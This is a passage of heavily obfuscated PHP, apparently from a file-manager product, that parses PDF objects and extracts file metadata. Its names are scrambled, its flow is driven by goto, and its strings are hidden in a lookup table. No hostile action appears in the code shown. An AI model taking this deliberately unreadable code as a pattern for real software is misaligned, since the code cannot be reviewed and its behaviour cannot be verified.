$CÆ±Ş‚ ƒ)) { $FÍº‚“Ô† = $dó¼¤Í´ğç[$fò¹í…åâ‹[77]] - $dó¼¤Í´ğç[$fò¹í…åâ‹[1565]]; foreach ($CÆ±Ş‚ ƒ[0] as $FÆØĞ¸„Æ => $díàÄÅ¡½«) { $b‹ÊéøéÖ = $CÆ±Ş‚ ƒ[1][$FÆØĞ¸„Æ] . $fò¹í…åâ‹[70] . $CÆ±Ş‚ ƒ[2][$FÆØĞ¸„Æ]; $D‚µ–íÏâ[$fò¹í…åâ‹[1585]][$b‹ÊéøéÖ] = strpos($f×µ£°æƒº, $díàÄÅ¡½«) + $FÍº‚“Ô† + 1; } } if (preg_match_all($fò¹í…åâ‹[1591], $f×µ£°æƒº, $CÆ±Ş‚ ƒ)) { $bö¬â²ŒÁ³ = count($CÆ±Ş‚ ƒ[1]) == 1 ? $CÆ±Ş‚ ƒ[1][0] : $CÆ±Ş‚ ƒ[1][1]; } else { $bö¬â²ŒÁ³ = substr($f×µ£°æƒº, -1024 * 5); } goto eùéñ—Õ–•; aÖã¡‹÷‡Æ: } private static function getObjectValue($E…ñØ£¦², $F³£®«©°–, $e¡ôß¤©ğ¸) { goto E†ß×àŒÈ; eŞ¸ë··¨†: if (!is_array($EÅŞéï²Ê[1])) { return array(); } $F¨¨ÛÂ¿ôİ = array(); for ($dÅÕ’Œîˆ‰ = 0; $dÅÕ’Œîˆ‰ < count($EÅŞéï²Ê[1]); $dÅÕ’Œîˆ‰ += 2) { $e‚®££Ü®Œ = $EÅŞéï²Ê[1][$dÅÕ’Œîˆ‰]; $cñğÁ¬¾«Š = $EÅŞéï²Ê[1][$dÅÕ’Œîˆ‰ + 1]; if (count($e‚®££Ü®Œ) == 3 && $e‚®££Ü®Œ[0] == $CğÔó™½Å[8]) { $e›ï½á…¯ = !1; if ($cñğÁ¬¾«Š[0] == $CğÔó™½Å[1600]) { $cñğÁ¬¾«Š = self::getObject($E…ñØ£¦², $F³£®«©°–[$CğÔó™½Å[1585]][$cñğÁ¬¾«Š[1]]); } $e›ï½á…¯ = $cñğÁ¬¾«Š[1]; if ($e›ï½á…¯ === !1) { continue; } if (is_string($e›ï½á…¯)) { $e›ï½á…¯ = self::decodeStr($e›ï½á…¯); } $F¨¨ÛÂ¿ôİ[$e‚®££Ü®Œ[1]] = $e›ï½á…¯; } } goto A“–Ø³‹ƒ; E†ß×àŒÈ: $CğÔó™½Å =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÅŞéï²Ê = self::getObject($E…ñØ£¦², $F³£®«©°–[$CğÔó™½Å[1585]][$e¡ôß¤©ğ¸]); if (is_string($EÅŞéï²Ê[1])) { return $EÅŞéï²Ê[1]; } goto eŞ¸ë··¨†; A“–Ø³‹ƒ: return $F¨¨ÛÂ¿ôİ; goto BÜ‹¯¡¶›Ÿ; BÜ‹¯¡¶›Ÿ: } private static function getObject($a²ï½‹Ë½°, $d ÚåŒÙÌ) { $dœíçİœë = self::getObjectItem($a²ï½‹Ë½°, $d ÚåŒÙÌ); $dœíçİœë = self::getObjectItem($a²ï½‹Ë½°, $dœíçİœë[2]); return $dœíçİœë; } private static function getObjectItem($AÜµ†¨ë²Ğ, $f·ÉçÏÖ»œ) { goto Fãé¹«¤ù¯; eš“çë•É: $f†Ø…¶µ²¾ = $f·ÉçÏÖ»œ >= $DØÏ´º» ? $f·ÉçÏÖ»œ - $DØÏ´º» : $f·ÉçÏÖ»œ; $f–ºëøù§Ñ = $f·ÉçÏÖ»œ >= $DØÏ´º» ? $AÜµ†¨ë²Ğ[$Cä…îÎ…Íì[1567]] : $AÜµ†¨ë²Ğ[$Cä…îÎ…Íì[1566]]; if ($f·ÉçÏÖ»œ > $eìÆé¨ÏÆ && $f·ÉçÏÖ»œ <= $DØÏ´º») { $f†Ø…¶µ²¾ = 0; $f–ºëøù§Ñ = StreamWrapperIO::read($AÜµ†¨ë²Ğ[$Cä…îÎ…Íì[75]], $f·ÉçÏÖ»œ, $eìÆé¨ÏÆ); } goto c—ºï‚Ş¨Â; c—ºï‚Ş¨Â: $b©½Á‘Úªâ = self::getRawObject($f–ºëøù§Ñ, $f†Ø…¶µ²¾); if ($f·ÉçÏÖ»œ >= $DØÏ´º») { $b©½Á‘Úªâ[2] = $b©½Á‘Úªâ[2] + $DØÏ´º»; } else { if ($f·ÉçÏÖ»œ > $eìÆé¨ÏÆ && $f·ÉçÏÖ»œ <= $DØÏ´º») { $b©½Á‘Úªâ[2] = $b©½Á‘Úªâ[2] + $f·ÉçÏÖ»œ; } } return $b©½Á‘Úªâ; goto Cìã»ê‚ª¢; Fãé¹«¤ù¯: $Cä…îÎ…Íì =& $_SERVER[åÌÛ»ô¢‚ö™]; $eìÆé¨ÏÆ = $AÜµ†¨ë²Ğ[$Cä…îÎ…Íì[1565]]; $DØÏ´º» = $AÜµ†¨ë²Ğ[$Cä…îÎ…Íì[77]] - $eìÆé¨ÏÆ; goto eš“çë•É; Cìã»ê‚ª¢: } private static function decodeStr($Aœî‹¿îÙ¦) { goto f„ùƒ­ĞÀ; Cƒ¶¨·ª‚: $Aœî‹¿îÙ¦ = $F¸„ôÛ¹¡…[33]; foreach ($BëÑ‡Òãá as $cà¬ßÛù¾å) { if (preg_match($F¸„ôÛ¹¡…[1615], $cà¬ßÛù¾å) && !1 === stripos($cà¬ßÛù¾å, $F¸„ôÛ¹¡…[1616])) { $cà¬ßÛù¾å = preg_replace($F¸„ôÛ¹¡…[1617], $F¸„ôÛ¹¡…[33], $cà¬ßÛù¾å); $cà¬ßÛù¾å = trim($cà¬ßÛù¾å, $F¸„ôÛ¹¡…[947]); $cà¬ßÛù¾å = pack($F¸„ôÛ¹¡…[1618], $cà¬ßÛù¾å); $Aœî‹¿îÙ¦ .= $cà¬ßÛù¾å; } else { $Aœî‹¿îÙ¦ .= $cà¬ßÛù¾å; } } if (preg_match($F¸„ôÛ¹¡…[1619], $Aœî‹¿îÙ¦)) { $e«¡Ë…Ø¹ = substr($Aœî‹¿îÙ¦, 2); $Aœî‹¿îÙ¦ = $F¸„ôÛ¹¡…[33]; $còù…ò«ß˜ = strlen($e«¡Ë…Ø¹); for ($e´š¬é©ÊÃ = 0; $e´š¬é©ÊÃ < $còù…ò«ß˜; $e´š¬é©ÊÃ += 2) { $D™´‘Ë®õ = hexdec(bin2hex(substr($e«¡Ë…Ø¹, $e´š¬é©ÊÃ, 2))); $Aœî‹¿îÙ¦ .= mb_convert_encoding($F¸„ôÛ¹¡…[1620] . intval($D™´‘Ë®õ) . $F¸„ôÛ¹¡…[67], $F¸„ôÛ¹¡…[1621], $F¸„ôÛ¹¡…[1622]); } } goto F³‰Ï·Š¦; f„ùƒ­ĞÀ: $F¸„ôÛ¹¡… =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aœî‹¿îÙ¦ = str_replace(array($F¸„ôÛ¹¡…[1601], $F¸„ôÛ¹¡…[1602], $F¸„ôÛ¹¡…[1603], $F¸„ôÛ¹¡…[1604], $F¸„ôÛ¹¡…[1605], $F¸„ôÛ¹¡…[1606], $F¸„ôÛ¹¡…[1607], $F¸„ôÛ¹¡…[1608]), array($F¸„ôÛ¹¡…[93], $F¸„ôÛ¹¡…[50], $F¸„ôÛ¹¡…[8], $F¸„ôÛ¹¡…[263], $F¸„ôÛ¹¡…[843], $F¸„ôÛ¹¡…[183], $F¸„ôÛ¹¡…[1015], $F¸„ôÛ¹¡…[345]), $Aœî‹¿îÙ¦); $BëÑ‡Òãá = preg_split($F¸„ôÛ¹¡…[1609], $Aœî‹¿îÙ¦, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bİÓ÷ğ¹—­; AøóÛåä„ô: $Aœî‹¿îÙ¦ = $F¸„ôÛ¹¡…[33]; foreach ($BëÑ‡Òãá as $cà¬ßÛù¾å) { if (preg_match($F¸„ôÛ¹¡…[1612], $cà¬ßÛù¾å)) { $Aœî‹¿îÙ¦ .= \chr(hexdec(trim($cà¬ßÛù¾å, $F¸„ôÛ¹¡…[1613]))); } else { $Aœî‹¿îÙ¦ .= $cà¬ßÛù¾å; } } $BëÑ‡Òãá = preg_split($F¸„ôÛ¹¡…[1614], $Aœî‹¿îÙ¦, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Cƒ¶¨·ª‚; bİÓ÷ğ¹—­: $Aœî‹¿îÙ¦ = $F¸„ôÛ¹¡…[33]; foreach ($BëÑ‡Òãá as $cà¬ßÛù¾å) { if (preg_match($F¸„ôÛ¹¡…[1610], $cà¬ßÛù¾å)) { $Aœî‹¿îÙ¦ .= \chr(octdec(trim($cà¬ßÛù¾å, $F¸„ôÛ¹¡…[93]))); } else { $Aœî‹¿îÙ¦ .= $cà¬ßÛù¾å; } } $BëÑ‡Òãá = preg_split($F¸„ôÛ¹¡…[1611], $Aœî‹¿îÙ¦, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto AøóÛåä„ô; F³‰Ï·Š¦: return $Aœî‹¿îÙ¦; goto CØ¶’Ñê; CØ¶’Ñê: } private static function getRawObject($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿ = 0) { goto a²¬©¸çÍ‡; d–‘îÏôñù: return array($FÈÙ˜˜„¯, $C®³Ç‡«ë†, $E‚ƒÓ“¼ˆ¿); goto BÓŞ­™ñŞ; a²¬©¸çÍ‡: $D¸‘ô·Ğæ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[33]; $C®³Ç‡«ë† = $D¸‘ô·Ğæ[33]; goto cî°Š‹ÃáÑ; cî°Š‹ÃáÑ: $E‚ƒÓ“¼ˆ¿ += strspn($E¦ éÛ“ŞÅ, $D¸‘ô·Ğæ[1623], $E‚ƒÓ“¼ˆ¿); $FèØ³ôé¿ø = $E¦ éÛ“ŞÅ[$E‚ƒÓ“¼ˆ¿]; switch ($FèØ³ôé¿ø) { case $D¸‘ô·Ğæ[383]: $d‚‹àôŒ”Í = strcspn($E¦ éÛ“ŞÅ, $D¸‘ô·Ğæ[1624], $E‚ƒÓ“¼ˆ¿); if ($d‚‹àôŒ”Í > 0) { $E‚ƒÓ“¼ˆ¿ += $d‚‹àôŒ”Í; return self::getRawObject($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿); } break; case $D¸‘ô·Ğæ[8]: $FÈÙ˜˜„¯ = $FèØ³ôé¿ø; ++$E‚ƒÓ“¼ˆ¿; $b‹Ì£¦„àí = preg_match($D¸‘ô·Ğæ[1625], substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 256), $E˜Çç‹“); if (1 == $b‹Ì£¦„àí) { $C®³Ç‡«ë† = $E˜Çç‹“[1]; $E‚ƒÓ“¼ˆ¿ += strlen($C®³Ç‡«ë†); } break; case $D¸‘ô·Ğæ[263]: case $D¸‘ô·Ğæ[843]: $FÈÙ˜˜„¯ = $FèØ³ôé¿ø; ++$E‚ƒÓ“¼ˆ¿; $b‚¹«ÒØì = $E‚ƒÓ“¼ˆ¿; if ($D¸‘ô·Ğæ[263] == $FèØ³ôé¿ø) { $D¼õ½¼Ùøå = 1; while ($D¼õ½¼Ùøå > 0) { if (!isset($E¦ éÛ“ŞÅ[$b‚¹«ÒØì])) { break; } $cçïéš¯Î = $E¦ éÛ“ŞÅ[$b‚¹«ÒØì]; switch ($cçïéš¯Î) { case $D¸‘ô·Ğæ[93]: ++$b‚¹«ÒØì; break; case $D¸‘ô·Ğæ[263]: ++$D¼õ½¼Ùøå; break; case $D¸‘ô·Ğæ[843]: --$D¼õ½¼Ùøå; break; } ++$b‚¹«ÒØì; } $C®³Ç‡«ë† = substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, $b‚¹«ÒØì - $E‚ƒÓ“¼ˆ¿ - 1); $E‚ƒÓ“¼ˆ¿ = $b‚¹«ÒØì; } break; case $D¸‘ô·Ğæ[157]: case $D¸‘ô·Ğæ[502]: $FÈÙ˜˜„¯ = $FèØ³ôé¿ø; ++$E‚ƒÓ“¼ˆ¿; if ($D¸‘ô·Ğæ[157] == $FèØ³ôé¿ø) { $C®³Ç‡«ë† = array(); do { $c½´Å÷«ºÉ = $E‚ƒÓ“¼ˆ¿; $a¾ê‘»‰»è = self::getRawObject($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿); $E‚ƒÓ“¼ˆ¿ = $a¾ê‘»‰»è[2]; $C®³Ç‡«ë†[] = $a¾ê‘»‰»è; } while ($D¸‘ô·Ğæ[502] != $a¾ê‘»‰»è[0] && $E‚ƒÓ“¼ˆ¿ != $c½´Å÷«ºÉ); array_pop($C®³Ç‡«ë†); } break; case $D¸‘ô·Ğæ[946]: case $D¸‘ô·Ğæ[949]: if (isset($E¦ éÛ“ŞÅ[$E‚ƒÓ“¼ˆ¿ + 1]) && $E¦ éÛ“ŞÅ[$E‚ƒÓ“¼ˆ¿ + 1] == $FèØ³ôé¿ø) { $FÈÙ˜˜„¯ = $FèØ³ôé¿ø . $FèØ³ôé¿ø; $E‚ƒÓ“¼ˆ¿ += 2; if ($D¸‘ô·Ğæ[946] == $FèØ³ôé¿ø) { $C®³Ç‡«ë† = array(); do { $c½´Å÷«ºÉ = $E‚ƒÓ“¼ˆ¿; $a¾ê‘»‰»è = self::getRawObject($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿); $E‚ƒÓ“¼ˆ¿ = $a¾ê‘»‰»è[2]; $C®³Ç‡«ë†[] = $a¾ê‘»‰»è; } while ($D¸‘ô·Ğæ[1626] != $a¾ê‘»‰»è[0] && $E‚ƒÓ“¼ˆ¿ != $c½´Å÷«ºÉ); array_pop($C®³Ç‡«ë†); } } else { $FÈÙ˜˜„¯ = $FèØ³ôé¿ø; ++$E‚ƒÓ“¼ˆ¿; $b‹Ì£¦„àí = preg_match($D¸‘ô·Ğæ[1627], substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿), $E˜Çç‹“); if ($D¸‘ô·Ğæ[946] == $FèØ³ôé¿ø && 1 == $b‹Ì£¦„àí) { $C®³Ç‡«ë† = strtr($E˜Çç‹“[1], $D¸‘ô·Ğæ[1628], $D¸‘ô·Ğæ[33]); $E‚ƒÓ“¼ˆ¿ += \strlen($E˜Çç‹“[0]); } elseif (!1 !== ($d¨Ê´¥¿ÉÂ = strpos($E¦ éÛ“ŞÅ, $D¸‘ô·Ğæ[949], $E‚ƒÓ“¼ˆ¿))) { $E‚ƒÓ“¼ˆ¿ = $d¨Ê´¥¿ÉÂ + 1; } } break; default: if ($D¸‘ô·Ğæ[1629] == substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 6)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1629]; $E‚ƒÓ“¼ˆ¿ += 6; } elseif ($D¸‘ô·Ğæ[99] == substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 4)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[99]; $E‚ƒÓ“¼ˆ¿ += 4; $C®³Ç‡«ë† = $D¸‘ô·Ğæ[99]; } elseif ($D¸‘ô·Ğæ[1630] == substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 4)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1631]; $E‚ƒÓ“¼ˆ¿ += 4; $C®³Ç‡«ë† = $D¸‘ô·Ğæ[1630]; } elseif ($D¸‘ô·Ğæ[1632] == substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 5)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1631]; $E‚ƒÓ“¼ˆ¿ += 5; $C®³Ç‡«ë† = $D¸‘ô·Ğæ[1632]; } elseif ($D¸‘ô·Ğæ[1633] == substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 6)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1633]; $E‚ƒÓ“¼ˆ¿ += 6; if (1 == preg_match($D¸‘ô·Ğæ[1634], substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿), $E˜Çç‹“)) { $E‚ƒÓ“¼ˆ¿ += strlen($E˜Çç‹“[0]); $B²êà•¾›å = $D¸‘ô·Ğæ[1635]; $b‹Ì£¦„àí = preg_match($B²êà•¾›å, substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿), $E˜Çç‹“, PREG_OFFSET_CAPTURE); if (1 == $b‹Ì£¦„àí) { $C®³Ç‡«ë† = substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, $E˜Çç‹“[0][1]); $E‚ƒÓ“¼ˆ¿ += $E˜Çç‹“[1][1]; } } } elseif ($D¸‘ô·Ğæ[1636] == substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 9)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1636]; $E‚ƒÓ“¼ˆ¿ += 9; } elseif (1 == preg_match($D¸‘ô·Ğæ[1637], substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 33), $E˜Çç‹“)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1600]; $E‚ƒÓ“¼ˆ¿ += strlen($E˜Çç‹“[0]); $C®³Ç‡«ë† = intval($E˜Çç‹“[1]) . $D¸‘ô·Ğæ[70] . intval($E˜Çç‹“[2]); } elseif (1 == preg_match($D¸‘ô·Ğæ[1638], substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, 33), $E˜Çç‹“)) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1639]; $C®³Ç‡«ë† = intval($E˜Çç‹“[1]) . $D¸‘ô·Ğæ[70] . intval($E˜Çç‹“[2]); $E‚ƒÓ“¼ˆ¿ += strlen($E˜Çç‹“[0]); } elseif (($fß©ê½¶®è = strspn($E¦ éÛ“ŞÅ, $D¸‘ô·Ğæ[1640], $E‚ƒÓ“¼ˆ¿)) > 0) { $FÈÙ˜˜„¯ = $D¸‘ô·Ğæ[1641]; $C®³Ç‡«ë† = substr($E¦ éÛ“ŞÅ, $E‚ƒÓ“¼ˆ¿, $fß©ê½¶®è); $E‚ƒÓ“¼ˆ¿ += $fß©ê½¶®è; } break; } goto d–‘îÏôñù; BÓŞ­™ñŞ: } } class GetInfo { private static $fileTypeArray; public static function get($CíåŞŞ¼â…) { $cš¦ä³àßÜ = IO::info($CíåŞŞ¼â…); return self::infoAdd($cš¦ä³àßÜ); } public static function check() { } public static function infoAdd(&$fŒ¢¿ñİµ) { goto dà¥öÏ•Óí; a‡¨É«‚©Ø: return $fŒ¢¿ñİµ; goto dòæ¢Š‡Ğª; dà¥öÏ•Óí: $bĞÔ¡Ÿö« =& $_SERVER[åÌÛ»ô¢‚ö™]; static $bæ’´åÁÀ§; if (!$bæ’´åÁÀ§) { require SDK_DIR . $bĞÔ¡Ÿö«[1642]; $bæ’´åÁÀ§ = new getID3(); } goto Bö…¨è¶­ª; AÅ«Â®Ñ×Â: $a½å½ë‹‚ = self::arrayValueLimit($a½å½ë‹‚); $a½å½ë‹‚[$bĞÔ¡Ÿö«[397]] = $Fóº÷‘éŞ; $fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[160]] = $a½å½ë‹‚; goto a‡¨É«‚©Ø; AÛâ¸½ò: $Fóº÷‘éŞ = $fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[165]]; try { if ($fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[165]] == $bĞÔ¡Ÿö«[1644]) { $a½å½ë‹‚ = self::psdParse($E± Ö’Ù˜Ñ); $Fóº÷‘éŞ = $bĞÔ¡Ÿö«[1645]; } else { if ($fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[165]] == $bĞÔ¡Ÿö«[1646]) { $a½å½ë‹‚ = self::pdfParse($E± Ö’Ù˜Ñ); } else { $Fóº÷‘éŞ = self::$fileTypeArray[$bĞÔ¡Ÿö«[1647]][$fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[165]]]; $b®¢±°Ñ = self::$fileTypeArray[$bĞÔ¡Ÿö«[1648]][$Fóº÷‘éŞ][$bĞÔ¡Ÿö«[1649]]; $aâ¾´ˆÓÔ” = @$bæ’´åÁÀ§->analyze($E± Ö’Ù˜Ñ, $fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[77]], $fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[28]]); $a½å½ë‹‚ = self::parseData($aâ¾´ˆÓÔ”, $b®¢±°Ñ, $fŒ¢¿ñİµ); } } } catch (Exception $Eµ– Òˆ£) { $a½å½ë‹‚ = array($bĞÔ¡Ÿö«[397] => $Fóº÷‘éŞ); } if (!$a½å½ë‹‚) { return; } goto AÅ«Â®Ñ×Â; Bö…¨è¶­ª: if (!$fŒ¢¿ñİµ || $fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[29]] != $bĞÔ¡Ÿö«[171]) { return; } if (!self::support($fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[165]]) || isset($fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[160]])) { return; } $E± Ö’Ù˜Ñ = $bĞÔ¡Ÿö«[1643] . $fŒ¢¿ñİµ[$bĞÔ¡Ÿö«[75]]; goto AÛâ¸½ò; dòæ¢Š‡Ğª: } public static function support($d”ÎÔ¥ìâÄ) { goto E÷ÍéÖÀÀš; E÷ÍéÖÀÀš: $DÎ‚Ÿ½¤â =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $d”ÎÔ¥ìâÄ = strtolower($d”ÎÔ¥ìâÄ); goto b½´ëğ°£ˆ; B•ù†’¯: return !1; goto eá·âÖ¦; b½´ëğ°£ˆ: $cö²áã˜£‰ = array($DÎ‚Ÿ½¤â[1646], $DÎ‚Ÿ½¤â[1644]); if (in_array($d”ÎÔ¥ìâÄ, $cö²áã˜£‰)) { return !0; } if (isset(self::$fileTypeArray[$DÎ‚Ÿ½¤â[1647]][$d”ÎÔ¥ìâÄ])) { return !0; } goto B•ù†’¯; eá·âÖ¦: } public static function arrayValueLimit($CñĞİ‚ôáğ, $FÓæƒ‚“¦‚ = 5000) { if (!is_array($CñĞİ‚ôáğ)) { return $CñĞİ‚ôáğ; } foreach ($CñĞİ‚ôáğ as $A¯œïÓ‘Ä => $DŠ‰‹• …ˆ) { if (is_string($DŠ‰‹• …ˆ) && strlen($DŠ‰‹• …ˆ) > $FÓæƒ‚“¦‚) { $CñĞİ‚ôáğ[$A¯œïÓ‘Ä] = substr($DŠ‰‹• …ˆ, 0, $FÓæƒ‚“¦‚); } else { if (is_array($DŠ‰‹• …ˆ)) { $CñĞİ‚ôáğ[$A¯œïÓ‘Ä] = self::arrayValueLimit($DŠ‰‹• …ˆ, $FÓæƒ‚“¦‚); } } } return $CñĞİ‚ôáğ; } private static function parseData($c¶Â³É‡¶“, $dïàÇÔ­Ô, $c£áÏ’¡ÎÈ) { $f­æêÜŸİÅ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÀñØ‰Úã = $c¶Â³É‡¶“[$f­æêÜŸİÅ[1650]]; $cçÇï¼î…» = array(); foreach ($dïàÇÔ­Ô as $AÓÒÓíã¦Š => $BÏ‰„—Ïª°) { foreach ($BÏ‰„—Ïª° as $d»¹³­¢ŒÑ) { if (is_array($d»¹³­¢ŒÑ)) { $fÓ´Ÿõ­ùÎ = self::parseData($c¶Â³É‡¶“, $BÏ‰„—Ïª°, $c£áÏ’¡ÎÈ); if ($fÓ´Ÿõ­ùÎ) { $cçÇï¼î…»[$AÓÒÓíã¦Š] = $fÓ´Ÿõ­ùÎ; } break; } $a”‰‡Û›Ñ® = str_replace($f­æêÜŸİÅ[1417], $cÀñØ‰Úã, $d»¹³­¢ŒÑ); $fÓ´Ÿõ­ùÎ = _get($c¶Â³É‡¶“, $a”‰‡Û›Ñ®); $fÓ´Ÿõ­ùÎ = is_array($fÓ´Ÿõ­ùÎ) ? $fÓ´Ÿõ­ùÎ[0] : $fÓ´Ÿõ­ùÎ; if ($fÓ´Ÿõ­ùÎ) { break; } } if ($fÓ´Ÿõ­ùÎ || $fÓ´Ÿõ­ùÎ === 0 || $fÓ´Ÿõ­ùÎ === !1) { $fÓ´Ÿõ­ùÎ = self::valueReset($d»¹³­¢ŒÑ, $fÓ´Ÿõ­ùÎ, $AÓÒÓíã¦Š); if ($fÓ´Ÿõ­ùÎ !== null) { $cçÇï¼î…»[$AÓÒÓíã¦Š] = $fÓ´Ÿõ­ùÎ; } } } $cçÇï¼î…» = self::valueResetAll($cçÇï¼î…», $c£áÏ’¡ÎÈ); return $cçÇï¼î…»; } private static function psdParse($f¢ä´êßŞ¬) { $AÓÛâŞÈî¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (IO::fileSubstr($f¢ä´êßŞ¬, 0, 4) != $AÓÛâŞÈî¢[1651]) { return !1; } $EŞ˜Ÿö¸˜ = getImageSize($f¢ä´êßŞ¬, $e·°¡è‹); if (!$EŞ˜Ÿö¸˜) { return; } $B¿ø´¤Ãš¦ = array($AÓÛâŞÈî¢[162] => $EŞ˜Ÿö¸˜[0], $AÓÛâŞÈî¢[163] => $EŞ˜Ÿö¸˜[1]); return $B¿ø´¤Ãš¦; } private static function pdfParse($aÑ²³ÊâÜÎ) { return FileParsePdf::parse($aÑ²³ÊâÜÎ); } private static function fileTypeParse() { $AÉó¤¶İÕ‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F¦Œ‰‡¶áƒ = self::fileTypeArray(); $e¦³ëËÕùè = array(); foreach ($F¦Œ‰‡¶áƒ as $aîÉ¸ÚŞŠó => $C«ê¹ä£î•) { $DÆ¹â­¨šï = _get($C«ê¹ä£î•, $AÉó¤¶İÕ‰[165], $AÉó¤¶İÕ‰[33]); $c•œ‡÷¨†í = is_string($DÆ¹â­¨šï) ? explode($AÉó¤¶İÕ‰[47], $DÆ¹â­¨šï) : $DÆ¹â­¨šï; if (!$c•œ‡÷¨†í) { continue; } foreach ($c•œ‡÷¨†í as $DÆ¹â­¨šï) { $DÆ¹â­¨šï = strtolower(trim($DÆ¹â­¨šï)); if (!$DÆ¹â­¨šï) { continue; } $e¦³ëËÕùè[$DÆ¹â­¨šï] = $aîÉ¸ÚŞŠó; } $F¦Œ‰‡¶áƒ[$aîÉ¸ÚŞŠó][$AÉó¤¶İÕ‰[165]] = array_keys($e¦³ëËÕùè); $F¦Œ‰‡¶áƒ[$aîÉ¸ÚŞŠó][$AÉó¤¶İÕ‰[1649]] = self::parseKeyMap($C«ê¹ä£î•[$AÉó¤¶İÕ‰[1649]]); } return array($AÉó¤¶İÕ‰[1648] => $F¦Œ‰‡¶áƒ, $AÉó¤¶İÕ‰[1647] => $e¦³ëËÕùè); } private static function parseKeyMap($Fééğ…ñé°) { $C“‚À°…¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($Fééğ…ñé° as $cÃ àÆÃİ¹ => $CãÚÔ²½Ï¢) { if (is_array($CãÚÔ²½Ï¢)) { $eÒ”¥öğŸÏ = self::parseKeyMap($CãÚÔ²½Ï¢); if ($eÒ”¥öğŸÏ) { $Fééğ…ñé°[$cÃ àÆÃİ¹] = $eÒ”¥öğŸÏ; } continue; } $f©£œ–¯ë = explode($C“‚À°…¸[47], $CãÚÔ²½Ï¢); $C¬ÁŞ‹Í = array(); foreach ($f©£œ–¯ë as $bˆØä††«Š) { $bˆØä††«Š = trim($bˆØä††«Š); if (!$bˆØä††«Š) { continue; } if (preg_match($C“‚À°…¸[1652], $bˆØä††«Š, $Bòøêå´•)) { $dâßÄ¡ª = explode($C“‚À°…¸[286], $Bòøêå´•[1]); foreach ($dâßÄ¡ª as $DÏ“Õ¬Šß) { $C¬ÁŞ‹Í[] = str_replace($Bòøêå´•[0], $DÏ“Õ¬Šß, $bˆØä††«Š); } } else { $C¬ÁŞ‹Í[] = $bˆØä††«Š; } } $Fééğ…ñé°[$cÃ àÆÃİ¹] = $C¬ÁŞ‹Í; } return $Fééğ…ñé°; } private static function valueResetAll($c³„¹Ù“Ü, $cÔ¾îóâË×) { goto dÏ¨ößƒ“¹; dÏ¨ößƒ“¹: $DÁ¾”ñÂ  =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($c³„¹Ù“Ü[$DÁ¾”ñÂ [1653]])) { $Bñ±áëÄ = ceil($c³„¹Ù“Ü[$DÁ¾”ñÂ [1653]]); $DßäÁÌ£òä = intval($Bñ±áëÄ / 3600); $C›¿¹¡“·  = intval(($Bñ±áëÄ - $DßäÁÌ£òä * 3600) / 60); $CÇ¬‚ƒáï = $Bñ±áëÄ % 60; $c³„¹Ù“Ü[$DÁ¾”ñÂ [1654]] = sprintf($DÁ¾”ñÂ [1655], $DßäÁÌ£òä, $C›¿¹¡“· , $CÇ¬‚ƒáï); if ($DßäÁÌ£òä == 0) { $c³„¹Ù“Ü[$DÁ¾”ñÂ [1654]] = sprintf($DÁ¾”ñÂ [1656], $C›¿¹¡“· , $CÇ¬‚ƒáï); } } $aÑÄî¢µ·è = _get($c³„¹Ù“Ü, $DÁ¾”ñÂ [1657]); goto B¤ß‘åì¾Ô; B¤ß‘åì¾Ô: if ($aÑÄî¢µ·è) { $eˆ” íÄˆº = IO_PATH_SYSTEM_TEMP . $DÁ¾”ñÂ [1658] . KodIO::hashPath($cÔ¾îóâË×) . $DÁ¾”ñÂ [1659]; $c³„¹Ù“Ü[$DÁ¾”ñÂ [1660]] = Action($DÁ¾”ñÂ 